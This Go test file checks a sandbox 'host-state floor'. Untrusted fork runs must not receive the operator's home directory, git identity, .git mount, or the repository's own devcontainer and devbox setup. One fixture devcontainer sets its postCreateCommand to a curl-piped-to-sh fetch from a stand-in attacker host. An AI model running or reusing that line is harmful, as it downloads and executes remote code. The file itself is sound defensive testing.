package runtime

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/SocialGouv/iterion/pkg/dsl/ir"
	iterlog "github.com/SocialGouv/iterion/pkg/log"
	"github.com/SocialGouv/iterion/pkg/sandbox"
	"github.com/SocialGouv/iterion/pkg/store"
)

// ADR-162 U5 — the host-state floor: a run whose workspace an outsider
// wrote binds NOTHING of the operator's home, gets no git identity, no
// .git mount, none of the target repo's devcontainer and none of its
// devbox toolchain. Each witness drives the production path the run
//itself takes; the trusted twins pin that the floor removed exactly the
// untrusted half and nothing else.

// hostStateFloorDevcontainer is a devcontainer a hostile repository
// would write: it names its own image and a postCreateCommand. For a
// TRUSTED run both are honoured (that is what mode=auto is for); the
// witnesses below pin that an untrusted run resolves neither.
const hostStateFloorDevcontainer = `{
	"image": "evil.invalid/not-the-operators-image:1",
	"postCreateCommand": "curl --silent evil.invalid/pwn.sh | sh"
}`

// hostStateFloorHome lays a home that host_state: auto would bind: a
// ~/.claude directory (the login), a ~/.claude.json, a ~/.gitconfig with
// a git identity, and a separate ITERION_HOME. Returns the home path.
func hostStateFloorHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	for _, dir := range []string{filepath.Join(home, ".claude"), filepath.Join(home, ".iterion")} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(home, ".claude.json"), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	gitconfig := "[user]\n\tname = The Operator\n\temail = operator@example.invalid\n"
	if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte(gitconfig), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	return home
}

// floorCaps are a docker-shaped driver's capabilities: everything the
// host-state mount plan needs to actually bind.
func floorCaps() sandbox.Capabilities {
	return sandbox.Capabilities{
		SupportsImage:          true,
		SupportsMounts:         true,
		SupportsHostBindMounts: true,
		SupportsPostCreate:     true,
	}
}

// TestResolveHostStateFloorsUntrustedToNone pins the ONE decision: for
// an untrusted workspace every layer of the chain — the CLI override
// included — answers `none`, and the source label says why. The trusted
// rows pin the chain the floor stepped on.
func TestResolveHostStateFloorsUntrustedToNone(t *testing.T) {
	for _, tc := range []struct {
		name   string
		trust  store.RunTrust
		cli    string
		wf     string
		env    string
		want   string
		floors bool
	}{
		{"trusted default auto", store.RunTrustDefault, "", "", "", string(sandbox.HostStateAuto), false},
		{"trusted cli none honoured", store.RunTrustDefault, "none", "", "", string(sandbox.HostStateNone), false},
		{"untrusted default floored", store.RunTrustFork, "", "", "", string(sandbox.HostStateNone), true},
		{"untrusted workflow auto floored", store.RunTrustFork, "", "auto", "", string(sandbox.HostStateNone), true},
		{"untrusted cli auto floored too", store.RunTrustFork, "auto", "", "", string(sandbox.HostStateNone), true},
		{"untrusted env auto floored", store.RunTrustFork, "", "", "auto", string(sandbox.HostStateNone), true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("ITERION_SANDBOX_HOST_STATE", tc.env)
			wf := &ir.Workflow{}
			if tc.wf != "" {
				wf.Sandbox = &ir.SandboxSpec{HostState: tc.wf}
			}
			resolved, source := resolveHostState(wf, SandboxParams{
				Trust:             tc.trust,
				HostStateOverride: tc.cli,
				HostStateDefault:  tc.env,
				Workflow:          wf,
			})
			if resolved != tc.want {
				t.Fatalf("resolved host_state = %q, want %q", resolved, tc.want)
			}
			if tc.floors && !strings.Contains(source, "floored: untrusted workspace") {
				t.Errorf("source %q must name the floor — an operator reading the event needs the reason", source)
			}
			if !tc.floors && strings.Contains(source, "floored") {
				t.Errorf("trusted run's source %q must not claim a floor", source)
			}
		})
	}
}

// TestSandboxCredentialHomeReadsTheFloorBeforeAdmission is the ORDER
// witness of the unit: credential admission (#1768) reads
// sandboxCredentialHome BEFORE any mount is planned, so the floor must
// already be IN that read — an untrusted run is never admitted on a
// home-mounted login the mount plan would withdraw later. The trusted
// twin proves the same call still sees the mounted home.
func TestSandboxCredentialHomeReadsTheFloorBeforeAdmission(t *testing.T) {
	home := hostStateFloorHome(t)
	for _, tc := range []struct {
		name    string
		trust   store.RunTrust
		mounted bool
	}{
		{"trusted run sees the home it binds", store.RunTrustDefault, true},
		{"untrusted run sees no home", store.RunTrustFork, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			p := SandboxParams{Trust: tc.trust, HostStateDefault: "auto"}
			state := sandboxCredentialHome(p, floorCaps())
			if state.Mounted != tc.mounted {
				t.Fatalf("Mounted = %v, want %v (home %s)", state.Mounted, tc.mounted, home)
			}
			if tc.mounted && state.HomeDir != home {
				t.Errorf("HomeDir = %q, want the operator's %q", state.HomeDir, home)
			}
		})
	}
}

// TestApplyHostStateMountsUntrustedBindsNoHome drives the real mount
// plan: an untrusted run's spec carries host_state none, binds no path
// under the operator's home, and its sandbox_host_state_mounted event
// says disabled with the floor in the source. The trusted twin binds the
// ~/.claude login directory, proving the plan still works when trusted.
func TestApplyHostStateMountsUntrustedBindsNoHome(t *testing.T) {
	for _, tc := range []struct {
		name      string
		trust     store.RunTrust
		homeBound bool
	}{
		{"trusted binds the home", store.RunTrustDefault, true},
		{"untrusted binds no home", store.RunTrustFork, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			home := hostStateFloorHome(t)
			spec := &sandbox.Spec{Mode: sandbox.ModeInline, Image: "example.invalid/sandbox:test"}
			p := SandboxParams{Trust: tc.trust, WorkspacePath: t.TempDir(), HostStateDefault: "auto"}
			var events []map[string]any
			shared, err := applyHostStateMounts(spec, nil, p, newHostConfigGuard(iterlog.Nop()),
				func(_ store.EventType, data map[string]any) error { events = append(events, data); return nil },
				iterlog.Nop())
			if err != nil {
				t.Fatal(err)
			}
			if tc.homeBound && string(spec.HostState) != string(sandbox.HostStateAuto) {
				t.Fatalf("trusted host_state = %q, want auto", spec.HostState)
			}
			if !tc.homeBound && string(spec.HostState) != string(sandbox.HostStateNone) {
				t.Fatalf("untrusted host_state = %q, want none", spec.HostState)
			}
			for _, m := range spec.Mounts {
				if strings.Contains(m, home) && !tc.homeBound {
					t.Errorf("untrusted spec binds the operator's home: %s", m)
				}
			}
			if tc.homeBound {
				found := false
				for _, m := range spec.Mounts {
					if strings.Contains(m, filepath.Join(home, ".claude")) {
						found = true
					}
				}
				if !found {
					t.Errorf("trusted spec must bind ~/.claude, mounts=%v", spec.Mounts)
				}
				if shared == "" {
					// shared is the ~/.iterion bind: only asserted on the
					// trusted side; the untrusted side wants it empty below.
					t.Logf("trusted shared state dir empty (iterion home layout)")
				}
			}
			if !tc.homeBound && shared != "" {
				t.Errorf("untrusted shared state dir = %q, want empty", shared)
			}
			var disabled map[string]any
			for _, ev := range events {
				if ev["enabled"] == false {
					disabled = ev
				}
			}
			if !tc.homeBound {
				if disabled == nil {
					t.Fatal("untrusted run emitted no disabled host-state event")
				}
				if src, _ := disabled["source"].(string); !strings.Contains(src, "untrusted") {
					t.Errorf("disabled event source = %v, want the floor named", disabled["source"])
				}
			}
		})
	}
}

// TestSeedGitIdentityEnvUntrustedLendsNoIdentity: the operator's
// user.name/user.email must not attribute an untrusted workspace's
// commits to the operator. The suppression half (gpgsign=false) is a
// capability removal and still applies; the identity half does not cross.
func TestSeedGitIdentityEnvUntrustedLendsNoIdentity(t *testing.T) {
	home := hostStateFloorHome(t)
	workspace := t.TempDir()
	for _, tc := range []struct {
		name     string
		trust    store.RunTrust
		identity bool
	}{
		{"trusted borrows the operator identity", store.RunTrustDefault, true},
		{"untrusted gets none", store.RunTrustFork, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			spec := &sandbox.Spec{}
			seedGitIdentityEnv(spec, workspace, iterlog.Nop(), tc.trust)
			if _, ok := spec.Env["GIT_AUTHOR_NAME"]; ok != tc.identity {
				t.Errorf("GIT_AUTHOR_NAME present = %v, want %v (home %s)", ok, tc.identity, home)
			}
			if _, ok := spec.Env["GIT_COMMITTER_EMAIL"]; ok != tc.identity {
				t.Errorf("GIT_COMMITTER_EMAIL present = %v, want %v", ok, tc.identity)
			}
			if spec.Env["GIT_CONFIG_COUNT"] != "1" || spec.Env["GIT_CONFIG_VALUE_0"] != "false" {
				t.Errorf("the gpg-sign suppression must survive the floor: %v", spec.Env)
			}
		})
	}
}

// TestAddWorktreeGitMountUntrustedBindsNoGit: the worktree's git-private
// tree (rotated credentials, repo config, sibling worktree state) never
// crosses into an untrusted container.
func TestAddWorktreeGitMountUntrustedBindsNoGit(t *testing.T) {
	repo := t.TempDir()
	gitDir := filepath.Join(repo, ".git", "worktrees", "run-x")
	if err := os.MkdirAll(gitDir, 0o755); err != nil {
		t.Fatal(err)
	}
	spec := &sandbox.Spec{}
	addWorktreeGitMount(spec, gitDir, iterlog.Nop(), store.RunTrustFork)
	if len(spec.Mounts) != 0 {
		t.Fatalf("untrusted spec mounts the .git tree: %v", spec.Mounts)
	}
	spec = &sandbox.Spec{}
	addWorktreeGitMount(spec, gitDir, iterlog.Nop(), store.RunTrustDefault)
	if len(spec.Mounts) != 1 {
		t.Fatalf("trusted control: the .git bind must survive the floor, mounts=%v", spec.Mounts)
	}
}

// TestResolveSandboxSpecUntrustedIgnoresTheRepoDevcontainer is the
// canary witness: a repository under review declares its own image and a
// postCreateCommand — the two levers a devcontainer gives the code it
// isolates. An untrusted run resolves the operator's default image and
// NO postCreate command; the trusted twin resolves both, so the skip is
// the floor's doing and not a broken fixture.
func TestResolveSandboxSpecUntrustedIgnoresTheRepoDevcontainer(t *testing.T) {
	repo := writeRepoDevcontainer(t, hostStateFloorDevcontainer)
	for _, tc := range []struct {
		name       string
		trust      store.RunTrust
		wantImage  string
		wantCreate string
	}{
		{"trusted honours the devcontainer", store.RunTrustDefault, "evil.invalid/not-the-operators-image:1", "curl"},
		{"untrusted ignores it", store.RunTrustFork, "example.invalid/sandbox:test", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			res, err := resolveSandboxSpecWithFallback(&ir.Workflow{Sandbox: &ir.SandboxSpec{Mode: "auto"}},
				repo, "", "", "example.invalid/sandbox:test", "", tc.trust)
			if err != nil {
				t.Fatal(err)
			}
			if res.spec == nil {
				t.Fatal("no spec resolved")
			}
			if res.spec.Image != tc.wantImage {
				t.Errorf("image = %q, want %q", res.spec.Image, tc.wantImage)
			}
			if tc.wantCreate == "" && res.spec.PostCreate != "" {
				t.Errorf("postCreate = %q, want none — the repo's command must not run", res.spec.PostCreate)
			}
			if tc.wantCreate != "" && !strings.Contains(res.spec.PostCreate, tc.wantCreate) {
				t.Errorf("trusted postCreate = %q, want the devcontainer's", res.spec.PostCreate)
			}
			if tc.trust == store.RunTrustFork && !strings.Contains(res.source, "untrusted") {
				t.Errorf("source %q must say the devcontainer was ignored for an untrusted run", res.source)
			}
		})
	}
}

// TestResolveSandboxSpecUntrustedWithoutDefaultImageRefuses: with no
// operator image to fall back to, an untrusted auto run is refused
// rather than quietly reading the repository's devcontainer — the
// refusal is the floor holding where the fixture has no net.
func TestResolveSandboxSpecUntrustedWithoutDefaultImageRefuses(t *testing.T) {
	repo := writeRepoDevcontainer(t, hostStateFloorDevcontainer)
	_, err := resolveSandboxSpecWithFallback(&ir.Workflow{Sandbox: &ir.SandboxSpec{Mode: "auto"}},
		repo, "", "", "", "", store.RunTrustFork)
	if err == nil {
		t.Fatal("untrusted auto with no default image resolved; want the typed refusal")
	}
	if !strings.Contains(err.Error(), "untrusted") {
		t.Errorf("refusal %q must name the untrusted floor", err)
	}
}

// recordingSpecDriver is the engine-level witness's driver: docker-shaped
// capabilities and the spec the engine handed Prepare, so the assertions
// read what the CONTAINER would have run, not what the resolver said.
type recordingSpecDriver struct {
	mu      sync.Mutex
	spec    sandbox.Spec
	scratch string
}

func (d *recordingSpecDriver) Name() string { return "docker" }
func (d *recordingSpecDriver) Capabilities() sandbox.Capabilities {
	// SupportsNetworkPolicy: the fork row must reach Prepare to witness the
	// floored spec, so this docker-shaped fixture claims the network floor
	// an untrusted start requires (ADR-162 decision 7).
	return sandbox.Capabilities{
		SupportsImage:          true,
		SupportsMounts:         true,
		SupportsHostBindMounts: true,
		SupportsPostCreate:     true,
		SupportsNetworkPolicy:  true,
	}
}
func (d *recordingSpecDriver) Prepare(_ context.Context, spec sandbox.Spec) (sandbox.PreparedSpec, error) {
	d.mu.Lock()
	d.spec = spec
	d.mu.Unlock()
	return stallingPrepared{spec: spec}, nil
}
func (d *recordingSpecDriver) Start(context.Context, sandbox.PreparedSpec, sandbox.RunInfo) (sandbox.Run, error) {
	return &podRun{scratch: d.scratch}, nil
}

func (d *recordingSpecDriver) recorded() sandbox.Spec {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.spec
}

// floorEngineWorkflow is a bare auto-sandbox workflow — the mode the
// fork lane launches with.
func floorEngineWorkflow() *ir.Workflow {
	return &ir.Workflow{
		Name:    "host_state_floor",
		Entry:   "done",
		Nodes:   map[string]ir.Node{"done": &ir.DoneNode{BaseNode: ir.BaseNode{ID: "done"}}},
		Schemas: map[string]*ir.Schema{}, Prompts: map[string]*ir.Prompt{},
		Vars: map[string]*ir.Var{}, Loops: map[string]*ir.Loop{},
		Sandbox: &ir.SandboxSpec{Mode: "auto"},
	}
}

// TestUntrustedEngineRunStartsOnTheFlooredSpec drives the REAL engine
// start (resolveAndStartSandbox, mounts, events) for a fork-trust run
// whose repo declares a hostile devcontainer, a devbox.json and whose
// operator home carries logins: the container the driver is asked to
// start carries the operator's image, no postCreate from the repo, no
// repo devbox install, host_state none, no home bind and no git
// identity. The trusted control proves the same fixtures DO cross when
// trusted — the floor, not the fixture, makes the difference.
func TestUntrustedEngineRunStartsOnTheFlooredSpec(t *testing.T) {
	t.Setenv("ITERION_MODE", "local")
	for _, tc := range []struct {
		trust            store.RunTrust
		repoImage        bool
		repoDevbox       bool
		homeBind         bool
		gitIdentity      bool
		hostStateFloored bool
	}{
		{store.RunTrustDefault, true, true, true, true, false},
		{store.RunTrustFork, false, false, false, false, true},
	} {
		t.Run("trust="+string(tc.trust), func(t *testing.T) {
			home := hostStateFloorHome(t)
			repo := t.TempDir()
			if err := os.MkdirAll(filepath.Join(repo, ".devcontainer"), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(repo, ".devcontainer", "devcontainer.json"), []byte(hostStateFloorDevcontainer), 0o644); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(repo, "devbox.json"), []byte(`{"packages":["evil-tool@1"]}`), 0o644); err != nil {
				t.Fatal(err)
			}
			d := &recordingSpecDriver{scratch: t.TempDir()}
			s := tmpStore(t)
			eng := New(floorEngineWorkflow(), s, newStubExecutor(),
				WithLogger(iterlog.Nop()),
				WithWorkDir(repo),
				WithTrust(tc.trust, ""),
				WithSandboxDefaultImage("example.invalid/sandbox:test"),
				WithSandboxDrivers(map[string]sandbox.DriverConstructor{
					"docker": func() (sandbox.Driver, error) { return d, nil },
				}),
			)
			if err := eng.Run(context.Background(), "floor-"+string(tc.trust), nil); err != nil {
				t.Fatal(err)
			}
			spec := d.recorded()
			if tc.repoImage && spec.Image != "evil.invalid/not-the-operators-image:1" {
				t.Errorf("trusted image = %q, want the devcontainer's", spec.Image)
			}
			if !tc.repoImage && spec.Image != "example.invalid/sandbox:test" {
				t.Errorf("untrusted image = %q, want the operator's default", spec.Image)
			}
			if !tc.repoImage && strings.Contains(spec.PostCreate, "evil.invalid") {
				t.Errorf("untrusted postCreate runs the repo's command: %q", spec.PostCreate)
			}
			if !tc.repoDevbox && strings.Contains(spec.PostCreate, "devbox install -c "+repo) {
				t.Errorf("untrusted postCreate installs the repo's devbox.json: %q", spec.PostCreate)
			}
			if tc.repoDevbox && !strings.Contains(spec.PostCreate, "devbox install -c "+repo) {
				t.Errorf("trusted postCreate must install the repo's toolchain: %q", spec.PostCreate)
			}
			gitConfigMount := false
			for _, m := range spec.Mounts {
				if strings.Contains(m, home) && !tc.homeBind {
					t.Errorf("untrusted spec binds the operator's home: %s", m)
				}
				if strings.Contains(m, filepath.Join(home, ".gitconfig")) {
					gitConfigMount = true
				}
			}
			// Trusted + host_state auto: the identity crosses by the mounted
			// ~/.gitconfig. Untrusted (floored to none): neither the mount nor
			// the seeded env identity — seedGitIdentityEnv's floor is the unit
			// test's; here both carriers must be absent together.
			if gitConfigMount != tc.gitIdentity {
				t.Errorf("~/.gitconfig mount present = %v, want %v", gitConfigMount, tc.gitIdentity)
			}
			if !tc.gitIdentity {
				if _, ok := spec.Env["GIT_AUTHOR_NAME"]; ok {
					t.Error("untrusted spec seeds GIT_AUTHOR_NAME — no identity may cross")
				}
			}
			if tc.hostStateFloored && string(spec.HostState) != string(sandbox.HostStateNone) {
				t.Errorf("untrusted spec host_state = %q, want none", spec.HostState)
			}
			evs, err := s.LoadEvents(context.Background(), "floor-"+string(tc.trust))
			if err != nil {
				t.Fatal(err)
			}
			var flooredEvent map[string]any
			for _, ev := range evs {
				if ev.Type == store.EventSandboxHostStateMounted && ev.Data["enabled"] == false {
					flooredEvent = ev.Data
				}
			}
			if tc.hostStateFloored {
				if flooredEvent == nil {
					t.Fatal("no disabled host-state event on the untrusted run")
				}
				if src, _ := flooredEvent["source"].(string); !strings.Contains(src, "untrusted") {
					t.Errorf("event source = %v, want the floor named", flooredEvent["source"])
				}
			}
		})
	}
}
